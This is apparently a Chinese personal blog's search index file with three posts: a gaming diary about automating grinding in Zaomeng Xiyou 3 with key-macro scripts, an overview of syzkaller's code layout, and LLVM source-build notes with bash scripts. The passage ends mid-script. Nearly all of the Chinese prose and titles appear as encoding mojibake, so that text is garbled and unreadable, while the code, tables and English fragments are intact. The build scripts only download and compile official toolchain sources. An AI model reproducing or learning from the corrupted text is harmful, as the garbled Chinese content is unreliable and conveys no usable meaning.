<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>å›å‘³ç«¥å¹´å°è®°ä¹‹é€ æ¢¦è¥¿æ¸¸</title>
    <link href="/2023/05/28/%E5%9B%9E%E5%91%B3%E7%AB%A5%E5%B9%B4%E5%B0%8F%E8%AE%B0%E4%B9%8B%E9%80%A0%E6%A2%A6%E8%A5%BF%E6%B8%B8/"/>
    <url>/2023/05/28/%E5%9B%9E%E5%91%B3%E7%AB%A5%E5%B9%B4%E5%B0%8F%E8%AE%B0%E4%B9%8B%E9%80%A0%E6%A2%A6%E8%A5%BF%E6%B8%B8/</url>
    
    <content type="html"><![CDATA[<p>å›å‘³ç«¥å¹´å°è®°ï¼Œåˆåæ‘¸é±¼å°è®°</p><span id="more"></span><h2 id="ç¢å¿µ-é‡æ¸©ç«¥å¹´"><a href="#ç¢å¿µ-é‡æ¸©ç«¥å¹´" class="headerlink" title="ç¢å¿µ - é‡æ¸©ç«¥å¹´"></a>ç¢å¿µ - é‡æ¸©ç«¥å¹´</h2><p>æœ€è¿‘çªç„¶å¾ˆæƒ³ç©å…»æˆå® ç‰©ç±»çš„æ¸¸æˆï¼Œè¿˜è¦æ±‚å® ç‰©æ‹¥æœ‰å„ç§å±æ€§å’ŒæŠ€èƒ½ï¼Œèƒ½å¤Ÿè¾…åŠ©æˆ˜æ–—ã€‚è¿™ç±»æ¸¸æˆçœŸä¸å¥½æ‰¾ï¼Œé¦–å…ˆæ’é™¤å£è¢‹å¦–æ€ªç³»åˆ—ï¼Œå› ä¸ºåœ¨æ›´ä¹…ä¹‹å‰æˆ‘å·²ç»é‡æ¸©è¿‡ä¸€éç©¶æç»¿å®çŸ³5.4äº†ï¼Œç°åœ¨æ­£å¤„äºé•¿è‰æœŸã€‚ç„¶åä¸€ç•ªæœç´¢ä¹‹ä¸‹ï¼Œæˆ‘å¾—åˆ°äº†ç­”æ¡ˆï¼šé€ æ¢¦è¥¿æ¸¸ï¼</p><p>è¯´èµ·æ¥é€ æ¢¦è¥¿æ¸¸ï¼ŒçœŸçš„æ˜¯æ»¡æ»¡çš„å›å¿†ï¼Œå°å­¦è¿˜æœ‰åˆä¸­ç©è¿‡é€ æ¢¦123ï¼Œæ— è®ºæ˜¯è‡ªå·±ç©å•äººæ¨¡å¼çš„æŒ‘æˆ˜bossçš„åˆºæ¿€æ„Ÿï¼Œè¿˜æ˜¯å’ŒåŒå­¦æŒ¤åœ¨é”®ç›˜å‰ä¸€èµ·ç©çš„åŒäººæ¨¡å¼çš„å…´å¥‹æ„Ÿâ€¦â€¦</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202305282130448.png"/></p><p>æ‰“å¼€é€ 2ï¼Œ4399çœŸçš„æ˜¯è‰¯å¿ƒæ»¡æ»¡ï¼Œå±…ç„¶è¿˜ç»™æˆ‘ä¿ç•™ç€åå¤šå¹´å‰çš„å­˜æ¡£ï¼Œé€ 3ä¹Ÿä¸€æ ·ï¼Œ2011å¹´çš„å­˜æ¡£ä¾æ—§åœ¨ï¼Œåªæ˜¯æœ‰äº›é—æ†¾çš„æ˜¯æˆ‘å·²ç»å›å¿†ä¸èµ·æ¥å½“åˆå’Œæˆ‘ä¸€èµ·ç©åŒäººæ¨¡å¼çš„äººéƒ½æœ‰è°äº†ï¼Œä¹Ÿè®¸æ˜¯é‚»å±…ä¹Ÿè®¸æ˜¯åŒç­åŒå­¦ã€‚</p><p>æœ€åç»¼åˆå¯¹æ¯”äº†(æŸ¥çŸ¥ä¹)é€ 1~5çš„ç©æ³•ä¸é£è¯„ï¼Œä»ç©æ³•å’Œå¯ç©æ€§ä¸Šè®²ï¼Œé€ 12æ˜¯å°‘äºé€ 345çš„ï¼›ä»ç»å…¸æ€§ä¸Šè®²é€ 123æ˜¯å¤§äºé€ 45çš„ï¼›ä»æ˜“ç©æ€§å’Œæˆ˜åŠ›å´©åä¸Šè®²ï¼Œé€ 123æ˜¯è¿˜æ˜¯ä¼˜äºé€ 45çš„ã€‚æ‰€ä»¥æœ€åè¿˜æ˜¯é€‰æ‹©äº†é€ 3ï¼Œé‡æ¸©å¼€æ¸©ï¼</p><h2 id="æ–°å°è±¡-è¿™æ¸¸æˆæ˜¯çœŸçš„è‚"><a href="#æ–°å°è±¡-è¿™æ¸¸æˆæ˜¯çœŸçš„è‚" class="headerlink" title="æ–°å°è±¡ - è¿™æ¸¸æˆæ˜¯çœŸçš„è‚"></a>æ–°å°è±¡ - è¿™æ¸¸æˆæ˜¯çœŸçš„è‚</h2><p>å…ˆç®€å•çœ‹äº†ä¸€ä¸‹é€ 3çš„å­˜æ¡£ä»¬ï¼Œå‘ç°æ— è®ºå•äººè¿˜æ˜¯åŒäººæ¨¡å¼ç­‰çº§éƒ½ä¸é«˜ï¼Œæ¸¸æˆå†…å®¹è§£é”åº¦ä¹Ÿéƒ½å¾ˆä½ï¼Œæœç„¶æˆ‘æ˜¯èŒæ–°å‘€ã€‚æ‰€ä»¥ä¸å¦‚é‡å¼€æ–°æ¡£ï¼Œæ­£å¥½ç†Ÿæ‚‰ä¸€ä¸‹æ¸¸æˆå†…å®¹ï¼Œæ¯•ç«Ÿä¹‹å‰çš„è®°å¿†å·²ç»ä¹…è¿œäº†ã€‚</p><p>é‡æ¥ä¸€éæœç„¶å‘ç°äº†è®¸å¤šæ–°é²œæœ‰è¶£çš„ä¸œè¥¿ï¼Œæ¯”å¦‚å°æ—¶å€™ç©æ²¡åŠ è¿‡è”ç›Ÿï¼Œæ¯”å¦‚æœ‰å¾ˆå¤šæ–°å‡ºçš„æ´»åŠ¨å’Œæ–°å‡ºçš„å® ç‰©â€¦â€¦è¿˜æœ‰ä¹‹å‰ä¸æ›¾ç•™æ„è¿‡çš„<strong>é€ æ¢¦é‡Œçš„æ•°å­¦é—®é¢˜ï¼šå„ç§æ¦‚ç‡çš„è®¡ç®—</strong>ï¼Œ<a href="https://www.bilibili.com/read/cv9669999/">é€ 3è£…å¤‡æ‰“é€ æ–¹æ¡ˆåŠå…¶è®¡ç®—è¿‡ç¨‹</a> è¿™ç¯‡æ–‡ç« è¶³ä»¥çª¥è§å†°å±±ä¸€è§’ã€‚</p><p>è¿˜æœ‰æœ€è¦å‘½çš„ï¼Œå°±æ˜¯è¿½æ±‚ä¼ è¯´è£…å¤‡ã€é¥°å“å’Œæ³•å®çš„æé™å±æ€§ã€‚ä»¥é€ 3ä¸¤å¤§åºŸè‚ç‹ä¹‹ä¸€çš„æ³•å® <strong>å¤ªæå…«å¦</strong> æ¥ä¸¾ä¾‹å§</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202305282149998.png"/></p><p>å¤ªæå…«å¦æœ‰ä»¥ä¸‹å±æ€§éœ€è¦åå¤åœ°å»åŒå¼€åˆ·ï¼š</p><ul><li>æˆé•¿ç‡ï¼šç›®æ ‡3.0ï¼Œè€Œå…¶èŒƒå›´ä¸º1.6-3.0ã€‚åˆæˆææ–™æˆé•¿ç‡æ‹‰æ»¡ä¸º2.5+2.5+1.7çš„æƒ…å†µä¸‹ï¼Œåˆæˆæˆé•¿ç‡ä¸º2.2+rand(0.1, 0.8)ã€‚ç›®æ ‡æ¦‚ç‡ä¸º$\frac{2}{8}$</li><li>äº”è¡Œï¼šå®Œç¾äº”è¡Œæ˜¯é‡‘+æœ¨ï¼Œè€Œæ¯æ¬¡åˆæˆ(æˆ–è€…é‡ç½®)å¾—åˆ°çš„äº”è¡Œä¸€å…±æœ‰ $5+C_{5}^{2}=15$ ç§ã€‚ç›®æ ‡æ¦‚ç‡ä¸º$\frac{1}{15}$</li><li>åŸºç¡€è¯æ¡(ç©¶æè‚)ï¼š<ul><li>æš´å‡»ï¼šç›®æ ‡8%ï¼ŒèŒƒå›´1~8%ï¼Œæ ·æœ¬æœ‰é™æˆ‘ä¹Ÿä¸çŸ¥é“æœ€ä½æ˜¯å¤šå°‘ï¼Œå§‘ä¸”è®¤ä¸ºæœ€ä½ä¸º1%å§</li><li>é—ªé¿ï¼šç›®æ ‡8%ï¼ŒèŒƒå›´1~8%ï¼Œä¸çŸ¥é“æœ€ä½æ˜¯å¤šå°‘</li><li>å›è¡€ï¼šç›®æ ‡28ï¼ŒèŒƒå›´1~28ï¼Œä¸å¤ªç¡®å®šæœ‰æ²¡æœ‰0</li><li>å›è“ï¼šç›®æ ‡8ï¼ŒèŒƒå›´1~8ï¼Œä¸å¤ªç¡®å®šæœ‰æ²¡æœ‰0</li><li>é­”æŠ—ï¼šç›®æ ‡8%ï¼ŒèŒƒå›´1~8%ï¼Œä¸çŸ¥é“æœ€ä½æ˜¯å¤šå°‘</li><li>è¯æ¡ç›®æ ‡æ¦‚ç‡ä¸º$\frac{1}{8} \times \frac{1}{8} \times \frac{1}{8} \times \frac{1}{28} \times \frac{1}{8} = \frac{1}{114688}$</li></ul></li></ul><p>æ‰€ä»¥å¤ªæå…«å¦åˆ·åˆ°ç›®æ ‡æé™å±æ€§çš„æ¦‚ç‡ï¼ˆè‰ç®—ï¼Œä¸å…·å‚è€ƒæ€§ï¼‰ä¸º$\frac{1}{6881280}$ï¼Œææ€–è‡³æï¼å°±ç®—åŸºç¡€è¯æ¡çš„å±æ€§ä¸‹é™åˆ†åˆ«ä¸º66116ï¼Œç›®æ ‡æ¦‚ç‡ä¹Ÿåªæœ‰$\frac{1}{362880}$mï¼Œæƒ³æƒ³å°±è‚ç–¼   :(</p><p><strong>æ‰€ä»¥å•Šï¼Œè¿˜å¾—ä¸Šè„šæœ¬ï¼å½“ç„¶æ˜¯æ¨¡æ‹Ÿæ“ä½œçš„é‚£ç§è„šæœ¬ï¼Œè€Œä¸æ˜¯ä¿®æ”¹å™¨ï¼ˆé‚£æ ·ä¼šè¢«è¸¢å‡ºè”ç›Ÿçš„ï¼‰</strong></p><h2 id="è‡ªåŠ¨åŒ–-æŒ‰é”®ç²¾çµä¹‹Qè¯­è¨€é€Ÿæˆ"><a href="#è‡ªåŠ¨åŒ–-æŒ‰é”®ç²¾çµä¹‹Qè¯­è¨€é€Ÿæˆ" class="headerlink" title="è‡ªåŠ¨åŒ– - æŒ‰é”®ç²¾çµä¹‹Qè¯­è¨€é€Ÿæˆ"></a>è‡ªåŠ¨åŒ– - æŒ‰é”®ç²¾çµä¹‹Qè¯­è¨€é€Ÿæˆ</h2><p>å¦‚æœæœ‰æ¨¡æ‹Ÿäººçš„é”®é¼ æ“ä½œçš„è„šæœ¬ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†é‡å¤çš„åˆ·å­å·¥ä½œäº¤ç»™æœºå™¨åœ¨é—²æš‡æ—¶é—´æ¥åšã€‚ç­”æ¡ˆå°±æ˜¯æŒ‰é”®ç²¾çµã€‚æŒ‰é”®ç²¾çµé‡‡ç”¨çš„æ˜¯Qè¯­è¨€ï¼Œæ˜¯åŸºäºVBScriptæ”¹è¿›çš„ä¸€ç§æ˜“å­¦æ˜“ç”¨ã€åŠŸèƒ½å¼ºå¤§çš„è„šæœ¬è¯­è¨€ã€‚ </p><p>ç„¶åå°±æ˜¯ä¸ºä»¥ä¸‹æœ‰é‡å¤è¡Œä¸ºçš„å·¥ä½œç¼–å†™è„šæœ¬ï¼š</p><ul><li>åˆ·ç¥ç§˜åº—é“º/çç åº—é“ºï¼ˆå·²å®Œæˆï¼‰</li><li>åˆæˆæå“å¤ªæå…«å¦ï¼ˆå·²å®Œæˆï¼‰</li><li>åˆæˆæå“èŠ±å®´ï¼ˆæœªå®Œæˆï¼‰</li><li>å¼ºåŒ–è£…å¤‡ï¼ˆæœªå®Œæˆï¼‰</li><li>è¯å›­ç§æ¤æ½œåŠ›è‰ï¼ˆå·²å®Œæˆï¼‰</li><li>åˆ·28æ˜Ÿå®¿ï¼ˆå·²å®Œæˆï¼‰</li><li>â€¦</li></ul><p><strong>ä»¥ä¸Šè„šæœ¬å‡å¼€æº</strong>ï¼š<a href="https://github.com/QGrain/zmxy3-auto">QGrain/zmxy-auto</a>ã€‚å®ç°æ€è·¯å˜›ï¼Œç®€çŸ­æ¥è¯´å°±æ˜¯â€æ¨¡æ‹Ÿâ€ï¼Œå†è¾¹ç”¨è¾¹æŸ¥ä¸€äº›Qè¯­è¨€çš„è¯­æ³•å°±è¡Œäº†ã€‚</p><p>ä¸€äº›æ€è€ƒï¼š</p><ul><li><p>æ˜¾ç¤ºå™¨åˆ†è¾¨ç‡çš„é€‚é…ï¼Œæˆ‘è¿™äº›è„šæœ¬çš„åƒç´ çº§åŒ¹é…éƒ½æ˜¯åœ¨2Kåˆ†è¾¨ç‡çš„èƒŒæ™¯ä¸‹åšçš„ï¼Œé‚£é€‚é…1080På’Œ4Kå‘¢ï¼Ÿ</p></li><li><p>è„šæœ¬åå°åŒ–ï¼šç›®å‰è„šæœ¬éƒ½æ˜¯æŒ‚åœ¨å‰å°è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æŒ‚æœºçš„åŒæ—¶ä¸å¯æ“ä½œç”µè„‘ã€‚å³ä¾¿å¯ä»¥åœ¨å‡ºå»åƒé¥­çš„æ—¶å€™ä½¿ç”¨æˆ–è€…æ‹¥æœ‰å¤šå°ç”µè„‘æ—¶ä½¿ç”¨ï¼Œä¾æ—§æ˜¯æœ‰äº›ä¸æ–¹ä¾¿ã€‚ä½†æ˜¯è„šæœ¬åå°åŒ–ç®€å•æŸ¥äº†ä¸€ä¸‹å†™æ³•ï¼Œä¼¼ä¹æœ‰äº›éº»çƒ¦å’Œä¸ç¨³å®šï¼Œæ‰€ä»¥æœ‰ç©ºå†ç ”ç©¶ç ”ç©¶ï¼ˆå·²ç»æ‘¸é±¼è®¸ä¹…äº†orzï¼‰</p></li><li>æŒ‰é”®ç²¾çµè¿˜èƒ½ç”¨æ¥å¹²ä»€ä¹ˆï¼šåœ¨ç«¯æ¸¸å’Œé¡µæ¸¸é¢†åŸŸé‡Œè‡ªç„¶ä¸ç”¨è¯´ï¼Œæ‰€æœ‰é‡å¤çš„å·¥ä½œéƒ½å¯ä»¥æ¬å¥—ã€‚é‚£ä¹ˆåœ¨æ—¥å¸¸å­¦ä¹ å’Œç§‘ç ”å·¥ä½œé¢†åŸŸå‘¢ï¼Ÿä¹Ÿè®¸è¿™ç§æ¨¡æ‹Ÿå¼çš„è¿ç»´å¯ä»¥ä½œä¸ºAPIå¼çš„è¿ç»´çš„ä¸€ç§æ›¿ä»£æ–¹æ¡ˆå§ï¼Œåœ¨æœ‰GUIçš„å‰æä¸‹ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Game</tag>
      
      <tag>QuickMacro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>syzkalleråŸç†ä¸ç†è§£</title>
    <link href="/2023/05/08/syzkaller%E5%8E%9F%E7%90%86%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
    <url>/2023/05/08/syzkaller%E5%8E%9F%E7%90%86%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>ç»“åˆæºç å’Œå®è·µï¼Œæ·±å…¥syzkalleråŸç†</p><span id="more"></span><h2 id="0-å‰è¨€"><a href="#0-å‰è¨€" class="headerlink" title="0 å‰è¨€"></a>0 å‰è¨€</h2><p>å­¦ä¹ å’Œä½¿ç”¨syzkalleræœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä¸€ç›´è€ä¸ä¸‹å¿ƒæ¥ä»”ç»†åœ°è¯»syzkalleræºç ï¼Œè€Œçœ‹å…¶ä»–æºç é˜…è¯»ç¬”è®°ä¹‹ç±»çš„åšå®¢åˆéš¾ä»¥å½¢æˆæ·±åˆ»çš„å°è±¡å’Œç†è§£ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸‹å®šå†³å¿ƒä»¥è‡ªå·±çš„æ–¹æ³•æ¥ç†è§£syzkallerè¿™ä¸ªå¤§é¡¹ç›®ï¼Œå¹¶ä¸”ä»¥è®°å½•åšæ–‡çš„å½¢å¼æ¥ç£ä¿ƒè‡ªå·±ã€‚ï¼ˆå“ˆå“ˆå“ˆï¼‰</p><h2 id="1-ä»£ç æ¶æ„"><a href="#1-ä»£ç æ¶æ„" class="headerlink" title="1 ä»£ç æ¶æ„"></a>1 ä»£ç æ¶æ„</h2><p class="note note-primary">è¦æ·±å…¥ç†è§£ä¸€ä¸ªåºå¤§çš„é¡¹ç›®ï¼Œæºç é˜…è¯»æ˜¯å¿…ä¸å¯å°‘çš„</p><p>é¦–å…ˆæ¥çœ‹çœ‹syzkallerçš„ä»£ç æ¶æ„ï¼Œç›®å‰ä¸ºæ­¢syzkalleæœ€æ–°çš„commitä¸º2023-05-06çš„<a href="https://github.com/google/syzkaller/commit/90c93c40627cb0ac3c2c7cb99d807fd4c137adcb">90c93c4</a>ï¼Œå…¶ä»£ç åˆ†å¸ƒå¦‚ä¸‹ï¼š</p><pre><code class="hljs bash">--------------------------------------------------------------------------------Language                      files          blank        comment           code--------------------------------------------------------------------------------Go                             3582         118754         270825        1002983JSON                             19              1              0          77237Markdown                        282           8538              0          25390C/C++ Header                     43           1483           1057          11522YAML                            149            517            691           6521Assembly                         34           1900            408           6288Bourne Shell                     44            543            837           3171C++                               4            172            199           1847Protocol Buffers                 13            379             51           1380make                             44            361             98           1251HTML                             15             58              0           1211Python                            8            220            186           1036Bourne Again Shell                4             52             90            455C                                 4             40             26            334CSS                               2             68              0            315Dockerfile                       10             56             97            218zsh                               1             14              3            191diff                              2             16             65            157yacc                              1             21              3            141TOML                              4             48            104            124JavaScript                        2             11              4            106AsciiDoc                          1             22              0             53--------------------------------------------------------------------------------SUM:                           4268         133274         274744        1141931--------------------------------------------------------------------------------</code></pre><p>å“‡è¶£ï¼Œä¹ä¸€çœ‹ä¸€ç™¾å¤šä¸‡è¡Œä»£ç å¤´éƒ½å¤§äº†ã€‚ä½†æŸ¥çœ‹æŒ‰ç…§åŠŸèƒ½æ¨¡å—ç›®å½•åˆ’åˆ†çš„ä»£ç è§„æ¨¡ï¼Œå°±ä¼šå‘ç°å…¶ä¸­å…«åå¤šä¸‡è¡Œéƒ½æ˜¯æ¥è‡ªvendorç®¡ç†æœºåˆ¶çš„åŒ…çš„ä»£ç ã€‚</p><pre><code class="hljs bash">.|-- Makefile|-- dashboard          (22699 Go)|-- docs               (6919 Markdown)|-- executor           (12953 C/C++, 280 Assembly, 257 Go)|-- pkg                (61924 Go)|-- prog               (12015 Go)|-- sys                (13332 Go)|-- syz-ci             (2282 Go)|-- syz-fuzzer         (1379 Go)|-- syz-hub            (975 Go)|-- syz-manager        (3218 Go)|-- syz-runner         (125 Go)|-- syz-verifier       (1693 Go)|-- tools              (16556 Go, 1017 Shell, 685 C/C++, 485 Py)|-- vendor             (859047 Go ... )|-- vm                 (7481 Go)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>Kernel</tag>
      
      <tag>Syzkaller</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LLVMå¤‡å¿˜å½•</title>
    <link href="/2023/03/02/LLVM%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2023/03/02/LLVM%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>LLVMå¤‡å¿˜å½•ã€ç¬”è®°å…¼å¿ƒå¾—</p><span id="more"></span><h2 id="1-æºç å®‰è£…LLVM"><a href="#1-æºç å®‰è£…LLVM" class="headerlink" title="1 æºç å®‰è£…LLVM"></a>1 æºç å®‰è£…LLVM</h2><h3 id="è½¯ä»¶ä¾èµ–ï¼š"><a href="#è½¯ä»¶ä¾èµ–ï¼š" class="headerlink" title="è½¯ä»¶ä¾èµ–ï¼š"></a>è½¯ä»¶ä¾èµ–ï¼š</h3><div class="table-container"><table><thead><tr><th>Package</th><th>Version</th><th>Notes</th></tr></thead><tbody><tr><td><a href="http://cmake.org/">cmake</a></td><td>&gt;=3.20.0</td><td>Makefile/workspace generator</td></tr><tr><td><a href="http://gcc.gnu.org/">GCC</a></td><td>&gt;=7.1.0</td><td>C/C++ compiler</td></tr><tr><td><a href="http://www.python.org/">python</a></td><td>&gt;=3.6</td><td>Automated test suite(Only needed for automatic test suite in <code>llvm/test</code>)</td></tr><tr><td><a href="http://zlib.net/">zlib</a></td><td>&gt;=1.2.3.4</td><td>Compression library(Optional)</td></tr><tr><td><a href="http://savannah.gnu.org/projects/make">GNU Make</a></td><td>&gt;=3.79.1</td><td>Makefile/build processor(Optional)</td></tr></tbody></table></div><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><p><strong>æ›´æ–°cmakeï¼š</strong></p><pre><code class="hljs bash"><span class="hljs-comment"># å¸è½½cmake</span><span class="hljs-built_in">sudo</span> apt remove -y cmake<span class="hljs-built_in">sudo</span> apt install -y libssl-devwget https://cmake.org/files/v3.23/cmake-3.23.0.tar.gztar zxvf cmake-3.23.0.tar.gz<span class="hljs-built_in">cd</span> cmake-3.23.0./configuremake -j8<span class="hljs-built_in">sudo</span> make install</code></pre><p><strong>è€ç‰ˆæœ¬ä¸€é”®å®‰è£…è„šæœ¬ï¼šbuild_llvm-old.sh</strong></p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-comment"># Install old version llvm-project from source. Two reasons why use this script:</span><span class="hljs-comment"># 1. llvm-project before 9.0.1 does not have a tarball of llvm-project. We need to download them seperately.</span><span class="hljs-comment"># 2. Older llvm-project (before 9.0.1?) uses some features which would be changed or deprecated in C++17. So we&#x27;d better use gcc-5 to compile llvm.</span><span class="hljs-built_in">set</span> -ecwd=`<span class="hljs-built_in">pwd</span>`ver=<span class="hljs-variable">$1</span>packages=(llvm cfe compiler-rt libcxx libcxxabi lld clang-tools-extra)base_url=https://releases.llvm.org/<span class="hljs-variable">$ver</span>src_dir=llvm-project-<span class="hljs-variable">$ver</span>.srcinstall_dir=llvm-project-<span class="hljs-variable">$ver</span>.install<span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$src_dir</span> <span class="hljs-variable">$install_dir</span><span class="hljs-comment"># download and extract</span><span class="hljs-built_in">pushd</span> <span class="hljs-variable">$src_dir</span><span class="hljs-keyword">for</span> pack <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;packages[@]&#125;</span><span class="hljs-keyword">do</span>        wget <span class="hljs-variable">$base_url</span>/<span class="hljs-variable">$pack</span>-<span class="hljs-variable">$ver</span>.src.tar.xz        tar xvJf <span class="hljs-variable">$pack</span>-<span class="hljs-variable">$ver</span>.src.tar.xz<span class="hljs-keyword">done</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\ndownload and extract finish&quot;</span><span class="hljs-built_in">mv</span> llvm-<span class="hljs-variable">$ver</span>.src llvm<span class="hljs-built_in">mv</span> cfe-<span class="hljs-variable">$ver</span>.src clang<span class="hljs-built_in">mv</span> compiler-rt-<span class="hljs-variable">$ver</span>.src compiler-rt<span class="hljs-built_in">mv</span> libcxx-<span class="hljs-variable">$ver</span>.src libcxx<span class="hljs-built_in">mv</span> libcxxabi-<span class="hljs-variable">$ver</span>.src libcxxabi<span class="hljs-built_in">mv</span> lld-<span class="hljs-variable">$ver</span>.src lld<span class="hljs-built_in">mv</span> clang-tools-extra-<span class="hljs-variable">$ver</span>.src clang-tools-extra<span class="hljs-comment"># build in $src_dir</span><span class="hljs-built_in">mkdir</span> build<span class="hljs-built_in">cd</span> buildcmake -G Ninja\                -DCMAKE_BUILD_TYPE=Release \                <span class="hljs-comment"># -DLLVM_ENABLE_PROJECTS=&quot;clang;lld;compiler-rt&quot; \</span>                -DLLVM_TARGETS_TO_BUILD=<span class="hljs-string">&quot;X86&quot;</span> \                -DCMAKE_INSTALL_PREFIX=<span class="hljs-variable">$cwd</span>/<span class="hljs-variable">$install_dir</span> \                -DLLVM_ENABLE_RUNTIMES=<span class="hljs-string">&quot;libcxx;libcxxabi&quot;</span> ../llvm<span class="hljs-comment"># cmake -G Ninja -DLIBCXX_ENABLE_SHARED=OFF -DLIBCXX_ENABLE_STATIC_ABI_LIBRARY=ON -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; -DLLVM_BINUTILS_INCDIR=/usr/include ../llvm</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\ncmake finish\n&quot;</span>ninja -j16<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nninja finish, return value: $?&quot;</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nplease: cd $cwd<span class="hljs-variable">$src_dir</span>/build &amp;&amp; ninja install&quot;</span></code></pre><p><strong>ä¸€é”®å®‰è£…è„šæœ¬ï¼šbuild_llvm-project.sh</strong></p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">set</span> -e<span class="hljs-function"><span class="hljs-title">print_help</span></span>()&#123;    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;Usage: ./build_llvm-project.sh LLVM_VERSION\n&quot;</span>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;[Notice] LLVM_VERSION&#x27;s format is X.Y.Z, *-rcN versions are not supported\n&quot;</span>    <span class="hljs-built_in">exit</span> 1&#125;<span class="hljs-function"><span class="hljs-title">get_url</span></span>()&#123;    OLD_IFS=<span class="hljs-variable">$IFS</span>    IFS=<span class="hljs-string">&quot;.&quot;</span>    arr=(<span class="hljs-variable">$1</span>)    IFS=<span class="hljs-variable">$OLD_IFS</span>    ver_val=0    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 0 2)    <span class="hljs-keyword">do</span>        ver_val=`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ver_val</span> * 10 + <span class="hljs-variable">$&#123;arr[$i]&#125;</span>&quot;</span> | bc`    <span class="hljs-keyword">done</span>    new_ver=1101    old_ver=901    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$ver_val</span> -ge <span class="hljs-variable">$new_ver</span> ]]    <span class="hljs-keyword">then</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;https://github.com/llvm/llvm-project/releases/download/llvmorg-<span class="hljs-variable">$1</span>/llvm-project-<span class="hljs-variable">$1</span>.src.tar.xz&quot;</span>    <span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$ver_val</span> -ge <span class="hljs-variable">$old_ver</span> ]]    <span class="hljs-keyword">then</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;https://github.com/llvm/llvm-project/releases/download/llvmorg-<span class="hljs-variable">$1</span>/llvm-project-<span class="hljs-variable">$1</span>.tar.xz&quot;</span>    <span class="hljs-keyword">else</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Old version &lt; 9.0.1, not supported (TODO). Exit.&quot;</span>        <span class="hljs-built_in">exit</span> 1    <span class="hljs-keyword">fi</span>&#125;cwd=`<span class="hljs-built_in">pwd</span>`version=<span class="hljs-variable">$1</span> <span class="hljs-comment"># like 13.0.1</span><span class="hljs-keyword">if</span> [[ ! <span class="hljs-variable">$version</span> ]]<span class="hljs-keyword">then</span>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;version is NULL\n&quot;</span>    print_help<span class="hljs-keyword">fi</span><span class="hljs-comment"># dependencies</span><span class="hljs-built_in">sudo</span> apt update<span class="hljs-built_in">sudo</span> apt install -y cmake ninja-build libedit-dev python3-dev swig<span class="hljs-comment"># download source</span>INSTALL_DIR=llvm-project-<span class="hljs-variable">$version</span>.installURL=`get_url <span class="hljs-variable">$version</span>`SRC_DIR=$(<span class="hljs-built_in">basename</span> <span class="hljs-variable">$URL</span> .tar.xz)<span class="hljs-keyword">if</span> [[ ! -e <span class="hljs-variable">$SRC_DIR</span>.tar.xz ]]; <span class="hljs-keyword">then</span>    wget <span class="hljs-variable">$URL</span><span class="hljs-keyword">fi</span><span class="hljs-keyword">if</span> [[ ! -d <span class="hljs-variable">$SRC_DIR</span> ]]; <span class="hljs-keyword">then</span>    tar xvJf <span class="hljs-variable">$SRC_DIR</span>.tar.xz<span class="hljs-keyword">fi</span><span class="hljs-keyword">if</span> [[ ! -d <span class="hljs-variable">$INSTALL_DIR</span> ]]; <span class="hljs-keyword">then</span>    <span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$INSTALL_DIR</span>    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$SRC_DIR</span>/build<span class="hljs-keyword">fi</span><span class="hljs-built_in">cd</span> <span class="hljs-variable">$SRC_DIR</span>/buildcmake -G Ninja\                -DCMAKE_BUILD_TYPE=<span class="hljs-string">&quot;Release&quot;</span> \                -DLLVM_ENABLE_PROJECTS=<span class="hljs-string">&quot;clang;lld;compiler-rt&quot;</span> \ <span class="hljs-comment"># Notice, compiler-rt has trouble with old ver of llvm</span>                -DLLVM_TARGETS_TO_BUILD=<span class="hljs-string">&quot;X86&quot;</span> \                -DLLVM_INSTALL_UTILS=ON \                -DCMAKE_INSTALL_PREFIX=<span class="hljs-variable">$cwd</span>/<span class="hljs-variable">$INSTALL_DIR</span> \                -DLLVM_ENABLE_RUNTIMES=<span class="hljs-string">&quot;libcxx;libcxxabi&quot;</span> ../llvm<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\ncmake finish\n&quot;</span>ninja -j8<span class="hljs-built_in">echo</span> -e <span 